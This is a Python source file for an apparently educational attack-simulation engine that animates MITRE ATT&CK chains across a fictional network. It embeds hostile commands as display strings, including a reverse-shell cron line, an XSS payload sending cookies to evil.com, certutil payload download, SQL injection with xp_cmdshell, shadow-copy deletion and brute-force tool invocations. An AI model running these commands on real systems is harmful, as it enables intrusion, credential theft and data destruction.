import asyncio
import random
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Callable
import networkx as nx

from api.models.schemas import (
    NetworkNode, NetworkEdge, NetworkTopology, AttackEvent,
    AttackType, NodeStatus, NodeType, SeverityLevel, SimulationResult
)
from services.nvd_service import get_random_cve, fetch_cves_for_attack

# MITRE ATT&CK full chain per attack type
ATTACK_CHAINS = {
    AttackType.RANSOMWARE: [
        ("T1566.001", "Spearphishing Attachment — malicious .docx delivered via email"),
        ("T1204.002", "User Execution — victim opened malicious macro-enabled document"),
        ("T1059.001", "PowerShell — dropper executed: `powershell -enc JABjAD...` (base64)"),
        ("T1055.012", "Process Hollowing — ransomware injected into svchost.exe (PID 2844)"),
        ("T1082", "System Information Discovery — OS fingerprint: Windows 10 Build 19045"),
        ("T1083", "File & Directory Discovery — enumerating shares: \\\\192.168.2.10\\C$"),
        ("T1021.002", "SMB/Windows Admin Shares — lateral movement via ADMIN$ share"),
        ("T1486", "Data Encrypted for Impact — AES-256 encryption started, ext: .locked"),
        ("T1490", "Inhibit System Recovery — `vssadmin delete shadows /all /quiet`"),
        ("T1491.001", "Defacement — ransom note dropped: README_DECRYPT.txt"),
    ],
    AttackType.SQL_INJECTION: [
        ("T1595.002", "Vulnerability Scanning — SQLMap v1.7.8 fingerprinting target"),
        ("T1190", "Exploit Public App — payload: `' OR '1'='1'; --` on /login endpoint"),
        ("T1190", "Auth Bypass — admin session established via UNION SELECT injection"),
        ("T1005", "Local Data — `SELECT * FROM users` — 47,832 records exfiltrated"),
        ("T1059.007", "JavaScript — stored XSS injected into user profile field"),
        ("T1078", "Valid Accounts — harvested admin credentials used for backend login"),
        ("T1213", "Data from Info Repos — PII dump: names, emails, hashed passwords"),
        ("T1048.003", "Exfiltration Over HTTPS — data sent to 185.220.101.47:443"),
    ],
    AttackType.BRUTE_FORCE: [
        ("T1595.001", "Active Scanning — Nmap scan: `nmap -sV -p22,3389,5985 192.168.1.0/24`"),
        ("T1046", "Service Discovery — SSH (22), RDP (3389), WinRM (5985) detected"),
        ("T1110.003", "Password Spraying — 'admin/Summer2024!' tried on 847 accounts"),
        ("T1110.001", "Password Guessing — Hydra: 12,847 attempts against ssh://192.168.1.30"),
        ("T1078", "Valid Accounts — SUCCESS: root:P@ssw0rd123 on 192.168.1.30:22"),
        ("T1098", "Account Manipulation — new backdoor user 'support_it' created"),
        ("T1136.001", "Local Account — persistence account added to sudoers"),
        ("T1053.003", "Cron Job — reverse shell cron: `@reboot bash -i >& /dev/tcp/185.220.101.47/4444`"),
    ],
    AttackType.DDOS: [
        ("T1595", "Active Scanning — target profiling: 192.168.1.10 (nginx/1.24.0)"),
        ("T1583.005", "Botnet — C2 beacon to 185.220.101.47 — 14,382 bots enlisted"),
        ("T1498.001", "Direct Network Flood — SYN flood: 847,293 pkt/s → 192.168.1.10:443"),
        ("T1498.002", "Reflection Amplification — DNS amplification x173 factor"),
        ("T1499.002", "Service Exhaustion — HTTP/2 Rapid Reset: 6M requests/s"),
        ("T1499.003", "Application Exhaustion — Slowloris: 65,000 half-open connections"),
        ("T1491.002", "External Defacement — HTTP 503 Service Unavailable — uptime: 0%"),
    ],
    AttackType.PHISHING: [
        ("T1598.003", "Spearphishing Link — email: 'Urgent: Your VPN credentials expire today'"),
        ("T1566.002", "Spearphishing Link — victim clicked: http://vpn-secure-login[.]com/auth"),
        ("T1056.003", "Web Portal Capture — credentials harvested: jdupont@company.com:Azerty123!"),
        ("T1539", "Session Cookie — Chrome cookie stolen via evil-proxy framework"),
        ("T1078.004", "Cloud Accounts — Microsoft 365 session hijacked (no MFA)"),
        ("T1114.002", "Remote Email Collection — Inbox forwarding rule added to attacker@proton.me"),
        ("T1530", "Data from Cloud — SharePoint: 2,847 confidential documents accessed"),
        ("T1048", "Exfiltration — 4.7GB data exfiltrated via OneDrive sync to rogue tenant"),
    ],
    AttackType.MALWARE: [
        ("T1195.002", "Supply Chain — trojanized npm package 'axios-utils' v2.1.4 installed"),
        ("T1204.002", "User Execution — malicious installer executed by IT admin"),
        ("T1055.001", "DLL Injection — malware injected into explorer.exe (PID 4192)"),
        ("T1547.001", "Registry Run Key — HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        ("T1071.001", "Web Protocols — C2 beacon to 91.242.217.58:80 every 30s (Cobalt Strike)"),
        ("T1027.005", "Indicator Removal — malware packed with UPX, strings obfuscated"),
        ("T1560.001", "Archive Collected Data — RAR archive: sensitive_data_20240521.rar"),
        ("T1041", "Exfiltration Over C2 — 847MB uploaded to attacker C2 over HTTPS"),
    ],
    AttackType.LATERAL_MOVEMENT: [
        ("T1046", "Network Service Discovery — `arp -a`, `net view /domain` executed"),
        ("T1018", "Remote System Discovery — ADRecon: 47 workstations, 8 servers found"),
        ("T1003.001", "LSASS Memory Dump — `mimikatz sekurlsa::logonpasswords` executed"),
        ("T1550.002", "Pass the Hash — NTLM hash used: aad3b435b51404eeaad3b435b51404ee:8846f7eaee..."),
        ("T1021.001", "RDP — lateral move: 192.168.2.10 → 192.168.2.11 via RDP (3389)"),
        ("T1021.006", "WinRM — remote command: `Invoke-Command -ComputerName db-01 -ScriptBlock`"),
        ("T1484.001", "Group Policy Modification — GPO modified to deploy attacker tools"),
        ("T1078.002", "Domain Accounts — DA credentials obtained: DOMAIN\\Administrator"),
    ],
    AttackType.ZERO_DAY: [
        ("T1595.002", "Vuln Scanning — Shodan search reveals unpatched Exchange Server"),
        ("T1190", "Exploit Public App — CVE-2024-XXXX (CVSS 9.8) — RCE via HTTP request"),
        ("T1059.003", "Windows Command Shell — `whoami /all` — NT AUTHORITY\\SYSTEM"),
        ("T1105", "Ingress Tool Transfer — `certutil -urlcache -f http://91.242.217.58/beacon.exe`"),
        ("T1543.003", "Windows Service — malicious service 'WinDefender32' installed"),
        ("T1068", "Privilege Escalation — kernel exploit: EternalBlue variant (MS17-010)"),
        ("T1112", "Registry Modification — DisableAntiSpyware=1, DisableRealtimeMonitoring=1"),
        ("T1070.001", "Clear Event Logs — `wevtutil cl System`, `wevtutil cl Security`"),
    ],
    AttackType.CREDENTIAL_STUFFING: [
        ("T1589.001", "Credential Intelligence — 2.7B leaked credentials from darkweb markets"),
        ("T1110.004", "Credential Stuffing — OpenBullet2: 847 combos/min against login API"),
        ("T1110.004", "Rate Limit Bypass — rotating 4,200 residential proxies (antidetect)"),
        ("T1078", "Valid Accounts — 2,847 accounts compromised (0.33% success rate)"),
        ("T1539", "Session Hijacking — stolen session tokens replayed across services"),
        ("T1556.006", "MFA Manipulation — SIM swap attack on 12 high-value accounts"),
        ("T1606.001", "Cookie Forging — persistent auth cookies crafted for 30-day access"),
    ],
    AttackType.PORT_SCAN: [
        ("T1595.001", "Active Scanning — `nmap -sS -sV -O -p- --min-rate 5000 192.168.0.0/16`"),
        ("T1046", "Network Service Discovery — 847 live hosts, 12,483 open ports found"),
        ("T1046", "Service Banner Grab — nginx/1.24.0, OpenSSH_8.9p1, PostgreSQL 15.2"),
        ("T1592.002", "Software Fingerprint — CVE-2023-44487, CVE-2024-21762 (unpatched!)"),
        ("T1590.005", "Network Topology Mapping — 3 subnets, 2 VLANs, 1 DMZ identified"),
        ("T1040", "Network Sniffing — ARP cache poisoning on 192.168.0.1 (gateway)"),
    ],
    AttackType.XSS: [
        ("T1595.002", "App Scanning — Burp Suite Pro: 47 injection points discovered"),
        ("T1059.007", "XSS Discovery — `<script>alert(document.cookie)</script>` — STORED"),
        ("T1059.007", "Cookie Theft — `<script>fetch('https://evil.com/?c='+document.cookie)</script>`"),
        ("T1539", "Session Hijacking — admin session token: sessionid=a8f3...b2e1 captured"),
        ("T1185", "Browser in the Middle — BeEF framework hooked 23 victim browsers"),
        ("T1056.004", "Credential API Hooking — keylogger injected into login form"),
        ("T1113", "Screen Capture — `html2canvas` screenshot sent to attacker every 5s"),
    ],
    AttackType.MAN_IN_THE_MIDDLE: [
        ("T1557.001", "ARP Poisoning — `arpspoof -i eth0 -t 192.168.1.10 192.168.1.1`"),
        ("T1040", "Network Sniffing — Wireshark capture: 847MB traffic intercepted"),
        ("T1557.002", "ICMP Redirect — traffic rerouted through attacker 192.168.1.99"),
        ("T1557", "SSL Stripping — HTTPS downgraded to HTTP — credentials in plaintext"),
        ("T1020", "Automated Exfil — credentials auto-extracted: 127 plaintext passwords"),
        ("T1563.001", "SSH Hijacking — SSH session hijacked via ptrace on shared server"),
        ("T1565.002", "Transmitted Data Manipulation — bank transfer modified: €47,000"),
    ],
}

REALISTIC_PAYLOADS = {
    AttackType.SQL_INJECTION: [
        "' UNION SELECT username,password,NULL FROM users--",
        "'; DROP TABLE sessions; INSERT INTO admin VALUES('hacker','$2b$12$...')--",
        "1' AND SLEEP(5)--",
        "' OR 1=1; EXEC xp_cmdshell('net user hacker P@ss /add')--",
    ],
    AttackType.RANSOMWARE: [
        "powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...",
        "vssadmin.exe delete shadows /all /quiet",
        "cipher /e /s:C:\\ (encrypting filesystem)",
        "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1",
    ],
    AttackType.BRUTE_FORCE: [
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.30",
        "medusa -h 192.168.1.30 -u root -P wordlist.txt -M ssh -t 4",
        "crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'",
    ],
    AttackType.MALWARE: [
        "C2 beacon: GET /pixel.png HTTP/1.1 Host: updates.microsoft-cdn[.]com",
        "Inject shellcode: \\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5...",
        "RunPE: hollow explorer.exe → inject ransomware payload",
    ],
}

CVE_REFERENCES = {
    AttackType.SQL_INJECTION: ["CVE-2023-23397", "CVE-2024-21762", "CVE-2023-44487"],
    AttackType.RANSOMWARE: ["CVE-2021-34527 (PrintNightmare)", "CVE-2017-0144 (EternalBlue)", "CVE-2020-1472 (Zerologon)"],
    AttackType.BRUTE_FORCE: ["CVE-2023-20198", "CVE-2024-3400"],
    AttackType.DDOS: ["CVE-2023-44487 (HTTP/2 Rapid Reset)", "CVE-2024-21762"],
    AttackType.ZERO_DAY: ["CVE-2024-XXXX (0-day, CVSS 9.8)", "CVE-2023-23397", "CVE-2024-3400 (PAN-OS)"],
    AttackType.MALWARE: ["CVE-2021-40444 (MSHTML)", "CVE-2022-30190 (Follina)"],
    AttackType.LATERAL_MOVEMENT: ["CVE-2020-1472 (Zerologon)", "CVE-2021-42278 (NoPac)", "CVE-2017-0144"],
    AttackType.PHISHING: ["CVE-2023-23397 (Outlook)", "CVE-2024-21410"],
    AttackType.XSS: ["CVE-2023-22518", "CVE-2024-27956"],
    AttackType.MAN_IN_THE_MIDDLE: ["CVE-2020-25705 (SAD DNS)", "CVE-2022-3602"],
    AttackType.CREDENTIAL_STUFFING: ["CVE-2023-20198"],
    AttackType.PORT_SCAN: [],
}

THREAT_ACTORS = [
    "APT28 (Fancy Bear / GRU)", "APT29 (Cozy Bear / SVR)", "Lazarus Group (DPRK)",
    "BlackCat / ALPHV", "LockBit 3.0", "Cl0p Ransomware Gang",
    "REvil / Sodinokibi", "Scattered Spider", "Volt Typhoon (China)",
]

IOC_IPS = [
    "185.220.101.47", "91.242.217.58", "194.165.16.11", "45.142.212.100",
    "179.43.154.137", "193.32.162.157", "5.188.206.14", "89.234.157.254",
]


def _rnd_payload(attack_type: AttackType) -> Optional[str]:
    payloads = REALISTIC_PAYLOADS.get(attack_type, [])
    return random.choice(payloads) if payloads else None


def _rnd_cve(attack_type: AttackType) -> Optional[str]:
    """Return a formatted CVE string — first tries real NVD data (fallback pool), then static list."""
    cve = get_random_cve(attack_type.value)
    if cve:
        return f"{cve['id']} (CVSS {cve['score']} {cve['severity']})"
    cves = CVE_REFERENCES.get(attack_type, [])
    return random.choice(cves) if cves else None


async def _rnd_cve_async(attack_type: AttackType) -> tuple[str, str, float]:
    """Async version — fetches from NVD API (with cache). Returns (id, desc, score)."""
    try:
        cves = await fetch_cves_for_attack(attack_type.value, count=1)
        if cves:
            c = cves[0]
            return c["id"], c["desc"], c["score"]
    except Exception:
        pass
    cve = get_random_cve(attack_type.value)
    if cve:
        return cve["id"], cve["desc"], cve["score"]
    return "CVE-2024-XXXX", "Unspecified vulnerability", 7.5


def generate_default_topology() -> NetworkTopology:
    # Positions spread across 3D space for impressive visualization
    nodes = [
        NetworkNode(id="fw-01", label="Palo Alto FW", type=NodeType.FIREWALL,
                    ip="192.168.0.1", os="PAN-OS 11.0.2",
                    services=["IDS/IPS", "SSL Inspection", "Threat Prevention"],
                    position={"x": 0, "y": 0, "z": 0}),
        NetworkNode(id="router-01", label="Core Router", type=NodeType.ROUTER,
                    ip="192.168.0.2", os="Cisco IOS XE 17.9",
                    services=["BGP", "OSPF", "QoS"],
                    position={"x": 320, "y": 0, "z": 0}),
        NetworkNode(id="web-01", label="Web Server", type=NodeType.SERVER,
                    ip="192.168.1.10", os="Ubuntu 22.04 LTS",
                    services=["nginx/1.24.0", "Node.js 20.x", "SSL/TLS 1.3"],
                    position={"x": 560, "y": 280, "z": 160}),
        NetworkNode(id="db-01", label="PostgreSQL DB", type=NodeType.DATABASE,
                    ip="192.168.1.20", os="Ubuntu 22.04 LTS",
                    services=["PostgreSQL 15.2", "Redis 7.2", "pgBouncer"],
                    position={"x": 560, "y": -280, "z": -160}),
        NetworkNode(id="auth-01", label="Auth Service", type=NodeType.API,
                    ip="192.168.1.30", os="Alpine Linux 3.19",
                    services=["Keycloak 23.0", "OAuth2", "LDAP/AD"],
                    position={"x": 800, "y": 200, "z": -200}),
        NetworkNode(id="api-01", label="API Gateway", type=NodeType.API,
                    ip="192.168.1.40", os="Alpine Linux 3.19",
                    services=["Kong Gateway", "GraphQL", "gRPC", "REST"],
                    position={"x": 800, "y": -200, "z": 200}),
        NetworkNode(id="ws-01", label="Workstation HR", type=NodeType.WORKSTATION,
                    ip="192.168.2.10", os="Windows 11 Pro 23H2",
                    services=["RDP", "SMB", "Office 365"],
                    position={"x": 1100, "y": 360, "z": 280}),
        NetworkNode(id="ws-02", label="Workstation Dev", type=NodeType.WORKSTATION,
                    ip="192.168.2.11", os="Windows 11 Pro 23H2",
                    services=["RDP", "SMB", "VS Code", "Docker"],
                    position={"x": 1100, "y": 80, "z": -80}),
        NetworkNode(id="ws-03", label="Workstation CFO", type=NodeType.WORKSTATION,
                    ip="192.168.2.12", os="macOS Sonoma 14.3",
                    services=["SSH", "VPN", "Outlook"],
                    position={"x": 1100, "y": -260, "z": -320}),
        NetworkNode(id="cloud-01", label="AWS EC2 Prod", type=NodeType.CLOUD,
                    ip="10.0.1.100", os="Amazon Linux 2023",
                    services=["S3", "EC2", "Lambda", "CloudWatch"],
                    position={"x": 1360, "y": 300, "z": 120}),
        NetworkNode(id="cloud-02", label="Azure VM Backup", type=NodeType.CLOUD,
                    ip="10.0.1.101", os="Windows Server 2022",
                    services=["Azure AD", "Blob Storage", "Key Vault"],
                    position={"x": 1360, "y": -300, "z": -120}),
        NetworkNode(id="iot-01", label="IoT SCADA Hub", type=NodeType.IOT,
                    ip="192.168.3.10", os="FreeRTOS 10.4",
                    services=["MQTT", "Modbus/TCP", "OPC-UA"],
                    position={"x": -280, "y": 200, "z": 240}),
    ]

    edges = [
        NetworkEdge(id="e1", source="fw-01", target="router-01", protocol="TCP/IP", encrypted=True),
        NetworkEdge(id="e2", source="router-01", target="web-01", protocol="HTTPS", port=443, encrypted=True),
        NetworkEdge(id="e3", source="router-01", target="db-01", protocol="TCP", port=5432),
        NetworkEdge(id="e4", source="web-01", target="auth-01", protocol="HTTPS", port=8443, encrypted=True),
        NetworkEdge(id="e5", source="web-01", target="api-01", protocol="gRPC", port=50051, encrypted=True),
        NetworkEdge(id="e6", source="api-01", target="db-01", protocol="TCP", port=5432),
        NetworkEdge(id="e7", source="auth-01", target="db-01", protocol="TCP", port=5432),
        NetworkEdge(id="e8", source="ws-01", target="router-01", protocol="TCP"),
        NetworkEdge(id="e9", source="ws-02", target="router-01", protocol="TCP"),
        NetworkEdge(id="e10", source="ws-03", target="router-01", protocol="TCP"),
        NetworkEdge(id="e11", source="api-01", target="cloud-01", protocol="HTTPS", port=443, encrypted=True),
        NetworkEdge(id="e12", source="cloud-01", target="cloud-02", protocol="Azure Peering", encrypted=True),
        NetworkEdge(id="e13", source="iot-01", target="fw-01", protocol="MQTT", port=8883, encrypted=True),
        NetworkEdge(id="e14", source="ws-01", target="ws-02", protocol="SMB", port=445),
        NetworkEdge(id="e15", source="ws-02", target="ws-03", protocol="SMB", port=445),
    ]

    return NetworkTopology(nodes=nodes, edges=edges)


class SimulationEngine:
    def __init__(self):
        self.topology = generate_default_topology()
        self.graph = self._build_graph()
        self.active_simulations: Dict[str, SimulationResult] = {}
        self.event_callbacks: List[Callable] = []
        self.node_states: Dict[str, NodeStatus] = {n.id: NodeStatus.SAFE for n in self.topology.nodes}

    def _build_graph(self) -> nx.Graph:
        G = nx.Graph()
        for node in self.topology.nodes:
            G.add_node(node.id, **node.model_dump())
        for edge in self.topology.edges:
            G.add_edge(edge.source, edge.target, **edge.model_dump())
        return G

    def register_callback(self, callback: Callable):
        self.event_callbacks.append(callback)

    async def _emit_event(self, event_type: str, data: dict):
        for callback in self.event_callbacks:
            try:
                await callback(event_type, data)
            except Exception:
                pass

    def get_topology(self) -> NetworkTopology:
        for node in self.topology.nodes:
            node.status = self.node_states.get(node.id, NodeStatus.SAFE)
            node.risk_score = {
                NodeStatus.SAFE: 0.05,
                NodeStatus.SUSPICIOUS: 0.40,
                NodeStatus.COMPROMISED: 0.75,
                NodeStatus.CRITICAL: 0.95,
                NodeStatus.OFFLINE: 0.20,
            }.get(node.status, 0.05)
        return self.topology

    def reset_topology(self):
        self.node_states = {n.id: NodeStatus.SAFE for n in self.topology.nodes}

    def _get_propagation_targets(self, node_id: str, attack_type: AttackType) -> List[str]:
        if node_id not in self.graph:
            return []
        neighbors = list(self.graph.neighbors(node_id))
        # Filter out already critical nodes for variety
        viable = [n for n in neighbors if self.node_states.get(n) not in [NodeStatus.CRITICAL]]
        return viable if viable else neighbors

    async def run_simulation(self, sim_request) -> SimulationResult:
        sim_id = str(uuid.uuid4())[:8]

        source = sim_request.source_node or random.choice([
            n.id for n in self.topology.nodes
            if n.type in [NodeType.WORKSTATION, NodeType.IOT]
        ])
        target = sim_request.target_node or random.choice([
            n.id for n in self.topology.nodes
            if n.id != source and n.type in [NodeType.SERVER, NodeType.DATABASE, NodeType.API]
        ])

        result = SimulationResult(
            simulation_id=sim_id,
            attack_type=sim_request.attack_type,
            start_time=datetime.now(),
            status="running"
        )
        self.active_simulations[sim_id] = result
        asyncio.create_task(self._execute_simulation(sim_id, sim_request, source, target))
        return result

    async def _execute_simulation(self, sim_id: str, sim_request, source: str, target: str):
        result = self.active_simulations[sim_id]
        attack_type = sim_request.attack_type
        chain = ATTACK_CHAINS.get(attack_type, [])
        actor = random.choice(THREAT_ACTORS)
        src_ip = random.choice(IOC_IPS)

        await self._emit_event("simulation_started", {
            "simulation_id": sim_id,
            "attack_type": attack_type.value,
            "source": source,
            "target": target,
            "threat_actor": actor,
            "source_ip": src_ip,
        })

        # === Phase 1: Reconnaissance / Initial Access ===
        self.node_states[source] = NodeStatus.SUSPICIOUS
        await self._emit_event("node_status_changed", {"node_id": source, "status": "suspicious", "simulation_id": sim_id})
        await asyncio.sleep(0.8)

        recon_steps = chain[:2] if len(chain) >= 2 else chain
        for i, (mitre, desc) in enumerate(recon_steps):
            ev = AttackEvent(
                id=str(uuid.uuid4())[:8],
                attack_type=attack_type,
                source_node=src_ip,
                target_node=source,
                timestamp=datetime.now(),
                severity=SeverityLevel.LOW if i == 0 else SeverityLevel.MEDIUM,
                success=True,
                payload=_rnd_payload(attack_type) if i == 0 else None,
                mitre_technique=mitre,
                description=f"[RECON] {desc} | Actor: {actor} | Src: {src_ip}"
            )
            result.events.append(ev)
            await self._emit_event("attack_event", ev.model_dump(mode="json"))
            await asyncio.sleep(random.uniform(0.5, 1.2))

        # === Phase 2: Initial Compromise ===
        self.node_states[source] = NodeStatus.COMPROMISED
        result.compromised_nodes.append(source)
        await self._emit_event("node_status_changed", {"node_id": source, "status": "compromised", "simulation_id": sim_id})

        cve_id, cve_desc, cve_score = await _rnd_cve_async(attack_type)
        exploit_mitre = chain[2] if len(chain) > 2 else (chain[0] if chain else ("T1190", "Exploitation"))
        exploit_ev = AttackEvent(
            id=str(uuid.uuid4())[:8],
            attack_type=attack_type,
            source_node=src_ip,
            target_node=source,
            timestamp=datetime.now(),
            severity=SeverityLevel.HIGH,
            success=True,
            payload=_rnd_payload(attack_type),
            mitre_technique=exploit_mitre[0],
            description=(
                f"[EXPLOIT] {exploit_mitre[1]} | "
                f"Vuln: {cve_id} (CVSS {cve_score}) — {cve_desc[:120]} | "
                f"Host: {source} | Actor: {actor}"
            )
        )
        result.events.append(exploit_ev)
        await self._emit_event("attack_event", exploit_ev.model_dump(mode="json"))
        await asyncio.sleep(random.uniform(0.8, 1.5))

        # === Phase 3: Execution / Persistence ===
        persist_steps = chain[3:5] if len(chain) > 4 else []
        for mitre, desc in persist_steps:
            ev = AttackEvent(
                id=str(uuid.uuid4())[:8],
                attack_type=attack_type,
                source_node=source,
                target_node=source,
                timestamp=datetime.now(),
                severity=SeverityLevel.HIGH,
                success=True,
                mitre_technique=mitre,
                description=f"[PERSIST] {desc} | Victim: {source}"
            )
            result.events.append(ev)
            await self._emit_event("attack_event", ev.model_dump(mode="json"))
            await asyncio.sleep(random.uniform(0.6, 1.0))

        # === Phase 4: Lateral Movement & Propagation ===
        if sim_request.propagate:
            await self._propagate_attack(sim_id, source, attack_type, sim_request.intensity, chain, actor, src_ip, depth=0)

        # === Phase 5: Impact ===
        impact_steps = chain[-2:] if len(chain) >= 2 else []
        for mitre, desc in impact_steps:
            ev = AttackEvent(
                id=str(uuid.uuid4())[:8],
                attack_type=attack_type,
                source_node=source,
                target_node=target if target in self.graph else source,
                timestamp=datetime.now(),
                severity=SeverityLevel.CRITICAL,
                success=True,
                mitre_technique=mitre,
                description=f"[IMPACT] {desc} | Compromised: {len(result.compromised_nodes)} nodes"
            )
            result.events.append(ev)
            await self._emit_event("attack_event", ev.model_dump(mode="json"))
            await asyncio.sleep(random.uniform(0.8, 1.5))

        result.status = "completed"
        result.total_damage_score = min(100, len(result.compromised_nodes) * 18 + len(result.events) * 2)

        await self._emit_event("simulation_completed", {
            "simulation_id": sim_id,
            "compromised_nodes": result.compromised_nodes,
            "total_damage_score": result.total_damage_score,
            "event_count": len(result.events),
            "threat_actor": actor,
        })

    async def _propagate_attack(self, sim_id: str, current_node: str, attack_type: AttackType,
                                 intensity: float, chain: list, actor: str, src_ip: str, depth: int):
        if depth > 3:
            return

        result = self.active_simulations[sim_id]
        await asyncio.sleep(random.uniform(1.0, 2.0))

        targets = self._get_propagation_targets(current_node, attack_type)
        max_spread = max(1, int(len(targets) * min(1.0, intensity + 0.2)))
        spread_targets = random.sample(targets, min(max_spread, len(targets)))

        lateral_mitre = chain[5] if len(chain) > 5 else ("T1021", "Remote Services lateral movement")
        node_obj = next((n for n in self.topology.nodes if n.id == current_node), None)
        src_label = node_obj.label if node_obj else current_node

        for next_node in spread_targets:
            if next_node in result.compromised_nodes:
                continue

            tgt_obj = next((n for n in self.topology.nodes if n.id == next_node), None)
            tgt_ip = tgt_obj.ip if tgt_obj else "unknown"
            tgt_label = tgt_obj.label if tgt_obj else next_node

            success_prob = 0.85 if depth == 0 else (0.70 if depth == 1 else 0.55)
            success = random.random() < success_prob

            severity = SeverityLevel.CRITICAL if depth == 0 else (
                SeverityLevel.HIGH if depth == 1 else SeverityLevel.MEDIUM
            )

            move_desc = (
                f"[LATERAL] {lateral_mitre[1]} | "
                f"{src_label} ({node_obj.ip if node_obj else '?'}) → "
                f"{tgt_label} ({tgt_ip}) | "
                f"{'SUCCESS — COMPROMISED' if success else 'BLOCKED by EDR'}"
            )

            ev = AttackEvent(
                id=str(uuid.uuid4())[:8],
                attack_type=attack_type,
                source_node=current_node,
                target_node=next_node,
                timestamp=datetime.now(),
                severity=severity,
                success=success,
                mitre_technique=lateral_mitre[0],
                description=move_desc
            )
            result.events.append(ev)
            await self._emit_event("attack_event", ev.model_dump(mode="json"))

            if success:
                new_status = NodeStatus.CRITICAL if depth == 0 else NodeStatus.COMPROMISED
                self.node_states[next_node] = new_status
                result.compromised_nodes.append(next_node)
                await self._emit_event("node_status_changed", {
                    "node_id": next_node,
                    "status": new_status.value,
                    "simulation_id": sim_id,
                })

                if attack_type in [AttackType.RANSOMWARE, AttackType.MALWARE,
                                    AttackType.LATERAL_MOVEMENT, AttackType.ZERO_DAY]:
                    await self._propagate_attack(
                        sim_id, next_node, attack_type,
                        intensity * 0.75, chain, actor, src_ip, depth + 1
                    )

            await asyncio.sleep(random.uniform(0.4, 1.0))

    def get_simulation_status(self, sim_id: str) -> Optional[SimulationResult]:
        return self.active_simulations.get(sim_id)

    def predict_next_targets(self, compromised_nodes: List[str]) -> List[str]:
        predicted = set()
        for node_id in compromised_nodes:
            if node_id in self.graph:
                for n in self.graph.neighbors(node_id):
                    if n not in compromised_nodes:
                        predicted.add(n)
        return list(predicted)[:5]


simulation_engine = SimulationEngine()
